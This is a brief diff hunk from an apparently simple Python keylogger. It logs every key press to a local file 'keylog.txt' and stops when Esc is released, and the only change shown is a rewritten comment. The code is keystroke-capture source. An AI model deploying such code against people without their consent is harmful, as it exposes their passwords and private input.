@@ -8,7 +8,7 @@ logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asct
 def on_press(key):
     logging.info(str(key))
 
-# Function to handle release of keys (not used in this example)
+# Function to handle release of keys
 def on_release(key):
     if key == Key.esc:
         # Stop listener
